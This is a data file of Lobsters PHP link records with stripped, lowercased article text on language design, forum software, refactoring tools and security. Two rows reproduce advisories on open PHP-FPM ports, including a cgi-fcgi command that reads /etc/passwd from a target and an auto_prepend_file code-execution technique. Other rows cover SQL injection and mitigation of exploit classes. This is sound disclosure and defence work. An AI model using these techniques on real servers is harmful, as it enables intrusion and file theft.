72,Lobsters,php,PHP programming,P++ idea: FAQ,https://wiki.php.net/pplusplus/faq,p idea faq,p idea faq internals list concern fork php mean doubling dev effort internals already low contributor deal make perpetual php lts done move stricter php need choose php p able mix match php p app mean php longer evolve new feature go p jit benefit approach nt risking fragmenting userbase stick dynamic php evolve towards stricter php fork codebase come creative solution cater audience differ nikita edition idea challenge hack nt would fair better general concern list concern converting php code p code trivial possible cleanup without breaking php compatibility popularity python nt typing really need different dialect,p idea faq clarifying faq idea presented internals attempt address many point raised repeatedly discussion ensued list concern idea compiled arnold daniel addressed note p temporary code name subject change trying shorten lengthy email couple point two big substantial school thought php world first like php roughly way dynamic strong bc bias emphasis simplicity prefers stricter language reduced baggage advancedcomplex feature right wrong school thought valid substantial following however challenging create language caters crowd time constant source contention internals proposal create new dialect php code named p live alongside php wo nt bound historical philosophy behind language word new dialect could inherently strict could daring bc remove element considered baggage short tag adding complex feature especially one good fit strictly typed language without introduce complexity php dialect fork code base identical developer working codebase vast majority code would identical specific point difference two dialect different implementation somewhat similar done stricttypes php larger scale related short tag short tag deprecation rfc main motivator idea goal proposal lot ambitious provide clear vision php hopefully finally put rest tension two school thought internals providing want fork php fork codebase identical would versioned together developed people binary identical install php installing p vice versa binary running php p combined phpp apps yet clear one would mark file p file would probably sort special header top file p php hello world addition may find way mark entire namespaces p framework nt explicitly mark every individual file p mean doubling dev effort internals already low contributor deal thankfully nt mean vast majority code shared php mode p mode source runtime data structure key subsystem extension web server interface opcache mostly everything else exact code running regardless whether file executed php one p one additional development overhead specific area difference php p true mean maintain two version certain piece code statement various place p likely additional check compared php however element would introduced anyway ever move towards stricter version php moreover since even folk strict crowd nt suggest move towards stricter future without providing migration path effectively effort involved approach virtually approach similar make perpetual php lts done move stricter php many issue approach probably important one dynamic crowd strictness equivalent progress nt want see future version php forcing direction still want get type new feature nonstrictness related better performance bug fix new extension making php stricter newer version mean many user upgrading would mean going backwards far development preference concerned equally important remarkably difficult arguably impractical development effort point view unlike proposal aim continue supporting dialect codebase version would longer actively developed would still maintained security critical bugfixes course decade requires resource simply nt arguably kind fork need choose php p yes mentioned install one also far apps go able run dialect single server even within app however practically speaking project individual likely typically pick standardize one similarly thing went stricttypes able mix match php p app yes need work exact mechanic designation whether code php p file level request level single execution request may load many different file file could dialect code php file behave php semantics code p file behave p semantics would similar stricttypes may sound awkward first could practical use case instance p framework used php application vice versa familiar c c somewhat similar mean php longer evolve new feature go p mean evolve differently strictness type related feature likely go p available p file bias bc remain php wo nt mean would never broken good returnoninvestment case case however unrelated feature performance improvement engine eg jit development extension new asyncrelated feature available php p benefit approach numerous benefit approach first give camp internals beyond good solution aspiration prefer dynamic nature php get keep prefer strictly typed language get obtain without bound limitation php alternative zero sum game win one group loss vice versa beyond good technological solution enables u support entire audience least amount effort could also bring end key source contention internals recent year finally although reader document likely technology people noted launching p would start clean slate could substantial positioningbranding advantage company development manager individual developer ruled php likely take note p launch launch php php nt risking fragmenting userbase degree nt flaw idea representation reality already exists ground mentioned huge crowd like dynamic nature php look warily attempt make typeoriented time another huge crowd look php think evolving slowly towards finally getting rid dynamic nonsense right wrong point view valid look potential solution bridge two contradictory point view nt many available stick dynamic php accepted proponent stricter language evolve towards stricter php accepted proponent dynamic language fork codebase net loss option everyone involved regardless done technological advantage nt enough contributor even wanted nt come creative solution cater audience proposal attempt keeping project unified ensuring perpetual interoperability two dialect level fragmentation minimal one possible still address everyone primary need differ nikita edition idea many similarity two idea also couple substantial difference note based limited understanding edition approach part may lacking inaccurate incorrect proposal stated goal keep current dynamically typed php long term fully supported equalamongequals dialect edition approach view current behavior legacy mean may discouraged point deprecated removed rollout strategy quite different p proposal aim first focus compatibilitybreaking element thing like strict ops change type conversion logic array index handling requiring variable declaration etc aim deliver first installment p goal allowing new projectsframeworks start fresh without knowing likely undergo major rewrite year two line compatibilitybreaking change introduced edition proposal appears goal instead aim gradually addchange element php related rollout edition approach nt allow two dialect number dialect could dialect along dialect dialect keep may actually increase maintenance complexity proposal also mention different bcbreak strategy php v p conservative v aggressive edition likely touch topic edition proposal quite positioningmarketing aspect proposal important note two idea nt necessarily mutually exclusive could introduce p evolve edition especially prof difficult get compatbreaking change first installment p challenge shortage challenge run first p app need get buyin mean folk school thought need give dream php entirely dynamic entirely statically typed disregarding think differently appears substantial challenge order successful first version p deal least compatibilitybreaking change php developer make probably fairly painful switch wo nt reauditradically refactor code future voiced concern may optimistic one installment limited developerpower evaluate better idea list note mean need implement idea may p first version prioritize element would trigger substantial enduser code rewrite try handle first release course challenging need find reasonable name new dialect hack nt would fair better conceptually motivation p hack similar least two critical difference two likely sufficiently big change expected outcome hack wasis developed single company open process volunteer even vendor behind gigantic company individual often reluctant standardize platform perhaps importantly hack hhvm php gigantic distribution vehicle hack uphill battle user even give try learn existence sufficiently interested learn assuming interested enough give try go trouble setting using entirely different method one used php day different layout different configuration different everything p radically different story ground every user php starting whenever make available available server install anything set anything simply turn mean virtually anybody running linux distro recent version wamp recent version mamp million server development workstation access p without anything proactively term awareness since p big part new php enjoy free marketing like hack could dream similar php performance splash php world unaware course nt mean everyone want start using barrier entry p many order magnitude lower hack face general concern arnold daniel compiled list concern proposal addressed converting php code p code trivial may true ultimately depends decide put p proposal assumes content want would similar regardless whether deliver using declare edition unified p dialect premise proposal large group people php space want change php substantially different way today making increasingly strong staticallytyped also assumes nt bad thing long nt treat zero sum game want keep php dynamic looselytyped presently important understand technologically actually slightly simpler vendor support p v support granular declare unlimited amount edition reason assume treated differently similar featureschanges introduced delivered using different mechanism possible cleanup without breaking php compatibility true actually good reason consider introducing new dialect vice versa many proponent strict also want make bigger leap term breaking downwards compatibility today option except zero sum game folk may fond breaking bc especially order make php stricter numerous instance recent time seems many store future regarding specific example brought andi removing array impact compatibility pphp syntactic salt modern syntax removing global namespace function affect p code ie access would removed still php code important stress neither idea discussed date may may proposed future inclusion p popularity python nt typing document proposal general claim suggest strongstatic typing good bad idea purposely nt take side side right acknowledge two substantially opposed school thought php user provides proposal project evolve address efficient productive manner said clearly lot people think stronglytyped php would better choice option may indeed increase popularity really need different dialect one axiom many strict camp appear believe stronglytyped staticallytyped language mean progress main question deliver php keeping dynamic crowd legacy version perhaps gradually releasing change every year get want crowd need clear people prefer dynamic looselytyped language strong static typing nt progress nt matter happens overnight course decade time many others prostrict folk pragmatic want simply add optional strictness along line stricttypes arguably called progress regressive anybody provide progress folk prefer stronglytyped statically typed language likely direction go mean already different dialect available anyway really matter whether dialect granular declare n dialect edition phpp
73,Lobsters,php,PHP programming,RCE through open PHP-FPM ports,https://www.openwall.com/lists/oss-security/2019/07/27/1,rce open phpfpm port,prev next day month year list http http twittercomswapgs http githubcomhannobfpmvulnblobmasterfpmrce http http hboeckde powered blists mailing list open source software security wiki mailing list mailing list read mailing list wikipedia guideline proper formatting message,prev next day month year list date sat jul hanno böck hanno eckde osssecurity tsopenwallcom subject rce open phpfpm port hi recently reported open fpm port may used exfiltrate data particularly affected hhvm originally assumed much le issue upstream php however swagpgs pointed actually much dangerous originally thought background fpm method execute php modern environment daemon listening incoming connection php nt need started request web server forward request fpm run either file socket tcp port tcp port never exposed public used remote code execution fpm daemon support passing php configuration option via phpvalue variable used inject php code via autoprependfile configuration option basically option provide script prependet every script execution may prevented setting allowurlinclude allowurlfopen however setting changed phpvalue well protection thing attacker need file php phar extension target system file wo nt executed due option securitylimitextensions fpm daemon default allows two however usually hard achieve guessing file standard path example debianubuntu system file usrbinpharphar exists alternatively system pear installed used put together bash script illustrate attack work notably hhvm affected attack vector nt support phpvalue however affected severely original file exfiltration issue tl dr never run fpm public network interface hhvm mean arbitrary file exfiltration php mean remote code execution http http twittercomswapgs http githubcomhannobfpmvulnblobmasterfpmrce http hanno böck http hboeckde mailjabber hanno eckde gpg powered blists mailing list please check open source software security wiki counterpart mailing list confused mailing list use read mailing list wikipedia check guideline proper formatting message
74,Lobsters,php,PHP programming,Reviving 20 year old web forum software,https://virtuallyfun.com/wordpress/2019/07/21/reviving-20-year-old-web-forum-software/,reviving year old web forum software,xorhash vbulletin used offer vbulletin lite expose internet reply limit account threadpost management icon plagiarism questionable security filename ending registerglobals much thing registerglobals mysql implicit default mysql implicit default various data type password caching exactly typo admin control panel feature remnant ampersand html made patch vbulletin lite vbulletinvirtuallyfuncom website used host vbulletin lite,guest post xorhash make nostalgic know definitely early web forum name like vbulletin ultimatebb phpbb yabb ikonboard bring smile face thus figured would time revisit oldest vbulletin could get hand turn vbulletin used offer vbulletin lite back year version vbulletin stripped much almost stop vbulletin hid behind form web archive quite catch managed find different copy online seems pristine enough least bunch code could get periodappropriate red hat installation going boring much work could possibly get run hindsight six hour please allow say code rather questionable quality expose internet without even trying found least two sql injection every sql injection immediately lead code execution php well since template interpreted using eval set quest port modern o softwareoriginal requirementmy version operating system different flavour unix well window ubuntu interpreterphp databasemysql detail rather boring allow point highlight discovery made digging code reply limit thread limited reply pagination reply beyond would replace recent post sure attempt preventing server client load excessively large page attempt encourage people actually buy vbulletinno account unlike vbulletin account post would username field optional field email address even provided email address get verifiedno threadpost management way conveniently delete thread post leaving forum completely defenseless spam suspect design nobody would stick vbulletin liteicon plagiarism icon search home button actually taken internet explorer comparison button internet explorer questionable security vbulletin lite pinnacle secure defensive coding though effort made e g using addslashes nowadays considered inappropriate available time php thorough overlooked spot encountering database error actual sql query error detail would shown html comment error page greatly helping attacker build sql injection even without source code available admin control panel password stored plaintext server well cookie persists admin session also sold using eval interpreting template databasefilenames ending back common php script filename ending though find exact reason used common practice possibly allow phpfi php coexist maybe nowadays everything normally php fileregisterglobals much thing php anti feature registerglobals caused request parameter cooky turned global variable script e g http wwwphpexampletestphp would set x vbulletin lite relied registerglobals existing working php removed version lot request handling needed changed vbulletin lite work allmysql implicit default apparently strict mode enabled mysql implicit default various data type vbulletin lite relied behavior much surprise sure thought good feature sure surprised password caching exactly successfully logging admin control panel cookie controlpassword set hardcoded expire beginning year glad try debug subtle issue patch make cookie expires start next yeara typo admin control panel adminforumphp deletion forum bring list forum however due typo modfiy instead modify page instead stay blank also took liberty fix obvious bugfeature remnant vbulletin lite kind look like rushjob love find true leftover various feature manifest stray variable referenced never set example email field template newthreadphp page actually reference password nothing else ever read set similarly forumdisplayphp reference datecut variable assume regular vbulletin would use prune old thread date save space database ampersand html vbulletin literal ampersand template namely link firefox complains nowadays expects amp even href want touch afraid might break old browser changing behavior mentioned made patch vbulletin lite make work modern version php mysql requires preparation renaming file php adjusting name included file ahead time apply cleanly mv basename php done cd admin mv basename php done cd find name php exec sed patch pathtopatchdiff vbulletin lite mechanism would send email configurable address sql error ended disabling dbmysqlphp spilling error onto page kept behavior patch make debugging easier since business running production anymore anyway see area marked todo want undo used new syntax introduced php patch may immediately work php though worst grunt work already taken care want give kick put one vbulletinvirtuallyfuncom website used host vbulletin lite note vbulletin lite may modified use circumstance may modified vbulletin lite code distributed hope separating pristine archive functional good enough still enough rightsholders currently mh sub llc dba vbulletin takedown request course honored
75,Lobsters,php,PHP programming,PoC: snippet to correctly capitalize names in PHP,https://timvisee.com/blog/snippet-correctly-capitalize-names-in-php/,poc snippet correctly capitalize name php,laravel collection van v â â â â snippet,building website kind user registration fascinating people enter name field casing random casing dozen space â â â betweenâ â â â â word nospacingatall seeing always irritates fancy thing nice consistent appears correctly normalizing name capitalization unsolvable puzzle consistency name casing kind name formatting matter see falsehood programmer believe name always wonder big social network handle okay nt solvable least could try make better came across wonderful php snippet name capitalization back shortage nt correctly case person last name instance needed storing firstlast name separate love challenge like decided improve take php normalize given partial name person recapitalize take last name insert account remove excess white space snippet http timviseecomblogsnippetcorrectlycapitalizenamesinphp param string name input name return string normalized name function namecase name list properly cased part cased l st mc van het ten den von und der de da iii iv vi vii viii ix trim whitespace sequence one space append space properly chunk name pregreplace name break name part split name separator part pregsplit oldstmc name pregsplitdelimcapture chunk part use cased uppercase first remove unfinished chunk part arraychunk part part arrayfilter part function part return sizeof part part arraymap function part use cased extract name separator part list name separator part use specified case separator set cased current arrayfilter cased function use separator return strcasecmp separator separator cased cased separator choose specified part case uppercase first default cased current arrayfilter cased function use name return strcasecmp name return cased cased ucfirst strtolower name separator part part arraymap function part return implode part part name implode part trim return normalized name return trim name tap expand better version use laravel variant concise us function approach using laravel collection php normalize given partial name person recapitalize take last name insert account remove excess white space snippet http timviseecomblogsnippetcorrectlycapitalizenamesinphp param string name input name return string normalized name function namecase name list properly cased part cased collect l st mc van het ten den von und der de da iii iv vi vii viii ix trim whitespace sequence one space append space properly chunk name pregreplace name break name part split name separator part pregsplit oldstmc name pregsplitdelimcapture chunk part use cased uppercase first remove unfinished chunk name collect part chunk filter function part return part count mapspread function name separator null use cased use specified case separator set cased cased first function use separator return strcasecmp separator separator cased separator choose specified part case uppercase first default cased cased first function use name return strcasecmp name return cased ucfirst strtolower name separator map function part return implode part join trim return normalized name return trim name course function fulfills truth table presented original snippet inputbecomes michael lucas george william stanley iiiwilliam stanley iii united state americaunited state america von lieres und wilkaut von lieres und wilkau paul van der knaappaul van der knaap jeanluc picardjeanluc picard john mclarenjohn mclaren henric viiihenric viii vasco da gamavasco da gama neatly pass additional previously problematic situation well brilliant inputoriginal snippetthis snippet van der knaapvan der knaapvan der knaap von lieresâ â â â und wilkauvon lieresâ â â â und wilkauvon lieres und wilkau normalizing using function like make impossible enter name formatted id knowing audience serve risk may able accept never perfect could always use suggest formatting improvement user allowing choose right using number identify people would rational choice except called pi feel free use share special thanks armand niculescu snippet inspired
76,Lobsters,php,PHP programming,Start a new project with an Event Sourcing Architecture,https://keith-mifsud.me/blog/start-a-new-project-with-an-event-sourcing-architecture,start new project event sourcing architecture,never event sourcing example project gumtree event storming event storming process member follows publish listing extracting event enjoying reading article privacy policy infrastructure plan subscribe kubernetes event sourcing framework use php broadway qanditate broadway prooph prooph still use symfony laravel development workflow event sourcing php get touch good one,firmly believe reallife processdriven application greatly benefit event sourcing system need know happened past event sourcing good architecture fit wish find lot engineer product owner developer believe assume implementing event sourcing architectural pattern system costly decision yet may notbuilding new system eventsourced domain costly opinion lot work le work example changing persisted state directly grapghql api yes write class represent event command easily generated using cli code file generation tool even nt use generator given consequence model representing business domain problem solving business opportunity providing simply careless unprofessionali saying implement event sourcing architecture project professional nt however saying always separate domain model dbal eloquent whatever use abstract persistence mechanism never source truth lot reason statement stand true many list however saying event sourcing candidate discussion planning software architecture new project since professional understand processdriven system require business domain choice whether domain follow basic ddd domain driven design architecture take separating command query responsibility using cqrs architectural pattern also choose combine reliable architecture retain much information possible present importantly future consumption event sourcing data gathering retention benefit factor new project costbenefit analysis engineer building new product decided implement event sourcing pattern primary architecture system domain article help get started even article first series writing show successfully costeffectively start finish eventsourced applicationwhen consulting software development agency software engineering laboratory building event sourcing system first second time get asked particular set question php event sourcing framework use still use symfony laravel application framework question way redundant domain dependent accessing application however gazing perspective also explain article planning external dependency important planning implementation integration costlyevent sourcing example projectthe best way help engineer product owner throughout series article example event sourcing project several component required building event sourcing project best way able plan estimate project understanding amount work required build adapt componentsto illustrate take plan build eventsourced application chose use simple todo application kidding todo application web basic justify pattern instead together building classified listing webbased application scaleddown version gumtree example project focus main business problem listing domain throughout series article show process follow plan design develop eventsourced listing application intentionally chose domain problem know much unless course created gumtree series article explain everything needed listing web api providing member ability drafting publishing listing advertise item wish sell purchase therefore write planning solve problem provide opportunity business setting development environment developing commonshared model developing first aggregate applying dispatching event using cqrs approach implementing concrete implementation system requirement testing crossdomain consequence read model access applicationi get right start business service offering perspective would start event storming however implementing infrastructure integration external service also planned ensure feasibility projectwe luck domain system make use external service however want highlight rare scenario depending product building may experience integration issue recently working smart condominium system whose internal hardware provider public api point yes common general service provider api real world lot vendor protect ip intellectual property offering accessible api whether developing event sourcing domain application using pattern pay determine integration possibility upfront example event sourcing project external service requirement infrastructure requirement easy implement quite commonevent stormingsame ddd domain driven design brainstorming event sourceddomain also start domain riskiest part developing new enterprise system understanding business domain thus throwing away day week even month work make sense start designing system domain upwards starting design domain also force project stakeholder start talking ubiquitous language drawing line term within bounded context ensuring feasibility systemevent storming listing domain going trivial understand domain limiting lot feature condition firstclass citizen eventsourced domain event storming exercise start following process actor go achieve desired function cover authentication membership series article however still include basic member domain code owneridentifier listing domain essentially memberidentifier also illustrate domain listen event another thus need one domainprocess member follows publish listing presumably registered member click create listing button navigate screen containing form describing listing listing required detail optional one member also add image viewer listing understand listed item better member publish listing member see member cancel listing time normally done listed item sold obtained member decided sell require listing lifetime fourteen day however member pause listing resume long total number day listing published exceed fourteen listing becomes automatically expired fourteen day expired listing listed public website listing owner change listing title listing owner place listing different category listing owner detach image listing description listing owner reprice listed item process simple enough left lot possible feature obviously real life type application allow comment messaging way interested member converse listing ownerextracting eventswith process mind written postit note stuck board start extracting valuable event process came following event listingdescribed listingimageattached listingpublished listingpaused listingresumed listingcancelled listingexpired listingrenamed listingrecategorised listingrepriced listingimagedetached process tell u lot event member perform listing although process detailed also tell u read model need business rule need met event occurwe come back process description often throughout project developmentare enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy informationinfrastructure planas already explained although planning application infrastructure implementation related business domain fact domain segregated layer including team working event sourcing first time system requires rare implementation wise plan scenario early possibleour example project make use quirky third party api rare database engine thus nt need detailed plan system infrastructure next article series setting development environment similar production one going deploy system cloud remote deployment subscribe email publish itwhen planning event sourcing project distributed consider lot different distribution strategy suggest every time leading team choose strategy popularity focus value product owner user using product example even release example project public opt microservices architecture type system may become busy thus may need scale vertically adding resource serf specific domain require major growth featuresthis type vertical growth easy scale modern technology project use container individual infrastructure requirement therefore easily replicate increase instance use container orchestrator kuberneteson hand say product owner decides start offering new feature using external service review system corporate member integrated trustpilot fyi nt like service easily spoofed engineer build run integration separate microservice accessible system rest api pubsub remote messaging apiwhich event sourcing framework use php several renowned le popular framework providing helper various element event sourced application including testing helper however found prefer use offtheshelf framework several reason reason specific particular framework however overall found using framework end extending vendor class inside domain source code nt want dependency runtime programming language domain source code internals framework also make hard impossible use adaptor pattern adapting framework within domainbroadwayin qanditate opensourced broadway package providing several infrastructure testing helper cqrs event sourced application faced designing developing first enterprisescale application written php found package useful time already worked event sourcing production using php probably already know like php nowadays write code php programming language however back day one would get laughed simply mentioning three letter php sprint planning meeting nowadays developed half dozen eventsourced system using broadway main reason like broadway way framework want structure code similar event sourcing pattern enterprise application architecture documented martin fowler easy pick feel confident system buildingwhat nt like broadway much nt like event sourcing framework helper library specifically nt like amount wiring using symfony framework scenario testing helper great nt helper extended without either rewrite concrete class say inmemoryeventstore declared final adding even external dependency domain source codejust elaborate fact example wanted write integration test subdomains ie one domain listens another event however write scenario test case long ready least write cachebased event store antipattern keep adding finally end copy broadway domain namespaceproophprooph set tightly lose cqrs event sourcing component well written however poorly documented personal opinion intuitive tried implementing prooph four time client project time personal sandbox project unfortunately never successful thing like prooph overall find hard justify extra worki find prooph concrete focused message bus nt want domain infrastructure dependant understand give take every situation believe give take using prooph domainhopefully needle say opinion simply opinion believe everyone contributes open source legend broadway prooph thank please keep sharing work u believe engineer developer agree hack event sourcing language hard develop infrastructure testing abstraction u design implement abstraction whether using library prooph broadway building find easier build mainly nt want external dependency domain source code library specifically badi sure would successful engineer building complex business system php without help broadway unfortunately prooph arrived lot later already accustomed way broadway want structure code back day working net language throughout series article using custom event sourcing infrastructure abstraction know maybe also implement third party library implementing abstractionscan still use symfony laravel certainly use either le application framework micro framework custom http library name itthe question whether team use make cringe domain source code concrete dependency believe type question common use laravel lot help providing lot helper structure application yes application maybe infrastructure configuration nothing else domain nt depend laravel symfony zend framework even dbal http router application rightly sole purpose application nt application framework help providing gateway software maybe even dependency injection binding interface concrete class general bootstrapping laravel also help structuring http layer controller request handler applicationlevel validation authentication acl requirement use laravel symfony nt want develop router session mechanism scratch since taylor otwell fabien potencier already mastered hardly everchanging aspect systemsthere way sacrificing month even year work establishing source code speaks business domain problem solves blood sweat project stakeholder nt want team add anything framework cost project come system work one major upgrade framework cost project business use framework intended forin series article see use laravel much afterthought framework disposabledevelopment workflow event sourcing phpthe process take build example event sourcing project probably ideal team building model first proceed infrastructure implementation application glue however depending size team separation stack skill would probably one engineer building model developer implementing abstraction infrastructure layer binding thing together application layer one size fit manner structure workflow topic team project dependant team company need guidance managing event sourcing project across team please get touch help youhave good onein article first series event sourcing article explained initial step take implementing eventsourced domain system recap domain planning start event storming team member always forecast integration implementation need planing normally come deciding architectural pattern use enterprise application serve feasibility study study ensures product owner getting best possible value present foreseeable future taking account vertical ad horizontal growth cost value
77,Lobsters,php,PHP programming,Running PHP in Javascript,https://francisco.io/blog/running-php-in-javascript/,running php javascript,running php javascript inside another experiment working demo initial objective googling around stackoverflow question reddit php search promising find githubnpm kanjis building library demo function lack documentation backticks closure,running php javascript wondering must given context experiment inside another experiment learn static site generator php first language knew well wanted test whether horrible bad idea use template come google trying find run php inside javascript likely lost beware article expert since large motivator site generator rely purely nodejs install ruby also nt want install php run php inside javascript need basic php feature variable echo loop sarcastic language article might deceiving working demo initial objective idea came making frontmatter work properly current file also related general dissatisfaction nodejs template engine topic another day title running php javascript head title title title meta content title property og title head reminded quite bit achieved raw php title running php javascript head title title title meta content title property og title head googling around google led stackoverflow question average score reading believe average score like also learned devs trying alert hello world astute reader might notice supposed run first php server sent browser finally run resulting alert hello world client level sophistication high want run raw php browser want something like server needed javascript parsing php alert php hello world even reddit php search ratwoodslaw could find seek promising find getting lucky php parser javascript search end finding package phpparser githubnpm problem output abstract syntax tree wanted run code whatever abstract tree seems since reading mean related project category found next clue head website funny looking cat babelpresetphp transpiles php javascript since babel total chaos whole babelloader v babelloader one know one ironic innit give take break practice kanjis speak family spanish think english title article building library fresh scavenge library babelpresetphp project using phpparser transform php abstract tree thing babelpresetphp ravaged file something idea way keep working babelgenerator finally generate javascript previous step bit javascript use fancier new function pretend better eval nt going show since code tiny thanks great library paste satisfaction import parser phpparser import translator translator import generator babelgenerator const run code opts make closure nt collide php variable let define echo since used transpiled j code reason optsecho optsecho str str pretend safe pro tip safe new function objectkeys opts code objectvalues opts return export default function src opts const ast new parser parsecode src const file translatortranslateprogram ast const code generator file code return run code opts later export individual part better testing really demo longawaited demo turn internet hide kid say prayer already loaded php function ready run tip make demo better lack documentation use backticks first argument php allow quote type multi line provide second argument plain object like hello world define variable hello value world inside php code want run express use get reqquery post reqbody second argument specially live server could pas window second argument well prefer php instead javascript heck could make tool find run script src ohmyphp type applicationphp script running eval code php function basically running eval internally get go jail card basically eval eval closure yup suck use example thing never happen really really need use want feature feel free throw load money might consider talking contacting relevant health authority reached point seeing many language ast generator ponder language transpiled javascript webassembly going eat j might give try hate php javascript really want let others know feel free comment hacker news
78,Lobsters,php,PHP programming,Data exfiltration with FPM servers (HHVM and rarely PHP),https://www.openwall.com/lists/oss-security/2019/07/09/2,data exfiltration fpm server hhvm rarely php,prev next day month year list http http hboeckde powered blists mailing list open source software security wiki mailing list mailing list read mailing list wikipedia guideline proper formatting message,prev next day month year list date tue jul hanno böck hanno eckde osssecurity tsopenwallcom subject data exfiltration fpm server hhvm rarely php fpm daemon may lead file exfiltration primarily affect hhvm fpm method execute php cgi script performant way fpm daemon provides either socket tcp port default used fastcgi protocol client request execution php script fpm supported upstream php hhvm hhvm originally reimplementation php facebook though current version longer support php syntax instead support hack programming language distinction relevant vulnerability fpm daemon running public ip may used exfiltrate file reason php script work php usually embedded within html file php tag rest file passed consequence every file nt php tag still sense valid php script nothing else outputting thus one connect open fpm port request execution eg etcpasswd file attacker interested manually tested cgifcgi command line tool available fcgi package many distribution scriptfilenameetcpasswd scriptnameetcpasswd requestmethodget cgifcgi bind connect targethost hhvm directly work default setting work eg standard ubuntu system using ubuntu hhvm package configuration change hhvm php syntax longer supported nt know exact circumstance test still able exfiltrate file others guess somehow depends file interpreted considering hack syntax response report facebook changed default setting expose fpm public ip upstream php vulnerability mitigated two fact first default setting fpm daemon listens localhost unless admin actively change setting unusual network setting available network second php fpm option securitylimitextensions restricts file extension recognized valid script set php phar default effectively mean arbitrary file exfiltrated unless setting changed exposing fpm public may still pose risk however attacker gain knowledge path php file accessible publicly may eg nonpublic php script protected via htaccess however given circumstance find unlikely big problem php case would consider configuration mistake php vulnerability case fpm daemon running public interface port almost certainly want may security risk published something german vuln http hanno böck http hboeckde mailjabber hanno eckde gpg powered blists mailing list please check open source software security wiki counterpart mailing list confused mailing list use read mailing list wikipedia check guideline proper formatting message
79,Lobsters,php,PHP programming,Snuffleupagus versus recent high-profile vulnerabilities,https://dustri.org/b/snuffleupagus-versus-recent-high-profile-vulnerabilities.html,snuffleupagus versus recent highprofile vulnerability,halvar flake snuffleupagus documentation straightforward nt measurable impact drupal pharbased deserialisation rule stream wrapper published rce magento commented arbitrary file upload horde checkpoint analysis whitelist support eval automatic generation whitelist basic parameter filtering friend charles fol unauthenticated sql injection ambionics prestashop cookie encryption glpi path traversal local file inclusion legitimate crosssite request forgery samesite marking based unserialize remote code execution phpbb wrapper whitelist feature logicbased remote code execution remote code execution rip eval whitelist rip rce session handling stored x rce wrapper whitelist logic bug reported email,according halvar flake law exploit mitigation useful least clear threat model nt add crazy lot complexitysignificantly hinder performancesmake everything undebuggeable render couple realworld past bug unexploitable snuffleupagus almost year old time look back check project decent job hardening mechanism removed keep virtualpatching capability threat model laid documentation regarding complexity snuffleupagus around line clean c code coverage close configuration straightforward could tested syntax making pool sysadmin devops write rule nt get single complain nobody opened single issue bugtracker performancewise nt measurable impact debugeability nt hindered snuffleupagus log every disruptive action take along line number file name even dump whole request wanted detects something tell precisely remaining question kill vulnerability also known two remote code execution drupal achieved via pharbased deserialisation snuffleupagus ship rule block vector although enabled default since people need use phar wrapper oneliner kill class vulnerability spwrapperswhitelistlist php nice sideeffect killing one could reached via stream wrapper daniel le gall scrt published rce magento trivially virtualpatched already blocked two enabledbydefault mitigation spreadonlyexecenable preventing writeable file executed spuploadvalidationscript yourscriptpy enable detecting uploaded file contains valid php code aborting execution unserializebased remote code execution snuffleupagus provides generic mitigation kind attack spunserializehmacenable preventing unauthenticated payload unserialized mitigation commented default configuration file since might break website stored serialized content enabling feature although simulation mode used seamlessly update data enabling mitigation drop mode ratiosec found arbitrary file upload horde mitigated exactly like daniel le gall magento rce spreadonlyexecenable preventing writeable file executed spuploadvalidationscript yourscriptpy enable detecting uploaded file contain php code abort execution remote code execution via interesting vector see checkpoint analysis detail snuffleupagus nt come generic mitigation make vulnerability unexploitable still interestingfun countermeasure catch kiddy whitelist support eval killing checkpoint exploit forcing attacker find way get payload executed automatic generation whitelist preventing introduction new callsites dangerous function forcing attacker use existing site ã la basic parameter filtering system friend making harder get code execution single request nt take much time serious attacker walk around mitigation likely stop kiddy charles fol ambionics found unauthenticated sql injection unfortunately snuffleupagus nt publicly available generic antisqli feature charles fol ambionics disclosed privilege escalation prestashop via attack insecure cryptographic mechanism used prestashop handle session snuffleupagus cookie encryption feature prevents stolen cooky used also ensure integrity preventing attack julien szlamowicz thomas chauchefoin damin picard synacktiv recently dumped couple glpi vulnerability simon scannell rip found path traversal local file inclusion wordpress leading remote code execution path traversal nt prevented snuffleupagus since ca nt distinguished legitimate usage however lfi prevented spreadonlyexecenable denying writeable file executed php second layer defense spuploadvalidationscript yourscriptpy enable detect whether uploaded file contain php code might bypassed gd library used process image compress uploaded allowing attacker hide backdoor snuffleupagus available decompression simon scannell rip found crosssite request forgery wordpress leading x escalated rce csrf mitigated samesite marking feature snuffleupagus x nt well since rce admin wordpress feature little nothing prevent without completely breaking wordpress p simon scannell rip disclosed phar based unserialize remote code execution phpbb mitigated wrapper whitelist feature snuffleupagus simon scannell rip found logicbased remote code execution woocommerce ca nt generically prevented simon scannell robin peraglie rip reported remote code execution via unserialize pydio mitigated spunserializehmacenable robin peraglie rip disclosed rce via eval injection moodle mitigated via eval whitelist feature something like spevalwhitelistlist simulation robin peraglie rip reported unserializebased remote code execution mitigated spunserializehmacenable like burned cool rce spip root cause lie creative session handling trivially virtualpatched various way unfortunately generic mitigation could prevent rce exploitable without completely breaking spip simon scannell rip found stored x rce magento x nt mitigated rce wrapper whitelist reported dave botsch authentication bypass logic bug snuffleupagus ca nt anything generic way trivially virtual patch robin peraglie rip reported deserializationbased remote code execution mitigated spunserializehmacenable x relies insufficient sanitization handling pseudoscheme create url scope snuffleupagus mitigation vulnerability nt killed either logic issue ca nt generically mitigated clientside issue like x explicitly scope applicationspecific issue ca nt dealt generic way sqli since like feature remain private seems snuffleupagus decent job feel free send email cool vulnerability would like added article
80,Lobsters,php,PHP programming,Instant Upgrades and Instant Refactoring of any PHP 5.3+ code,https://github.com/rectorphp/rector,instant upgrade instant refactoring php code,rector upgrade legacy app modern codebase rec tor instant upgrade instant refactoring sponsor rector patreon paypal opensource first instantly upgrade instantly refactors php code application rector install rector prefixed docker image running rector rule set configuration ignore rector rule file run rector rule safe type experimental limit execution changed file symfony container detailed documentation contribute contribution guide run rector docker debugging community package known drawback apply coding standard nikicphpparser project need coding standard tool ec,rector upgrade legacy app modern codebase rector reconstructor tool instant upgrade instant refactoring code refactor manually rector handle task sponsor rector grows faster help help work save check rector patreon onetime donation welcome paypal thank opensource first rector instantly upgrade instantly refactors php code application support version php many opensource project rector install composer require rectorrector dev conflict composer require use rector prefixed using different php version rector support use docker image running rector main way use rector single rule change control pick rule group rule called set pick set set suitable opensource project design pattern like use create rectorphp root directory php rectorphp declare use rectorcoreconfigurationoption use use rectorsetvalueobjectsetlist use symfonycomponentdependencyinjectionloaderconfiguratorcontainerconfigurator return static function containerconfigurator containerconfigurator void get parameter parameter containerconfigurator parameter define set rule applied parameter set option set setlist codequality get service service containerconfigurator service register single rule service set typedpropertyrector class dry run rector vendorbinrector process src dryrun rector show diff file would change make change drop dryrun 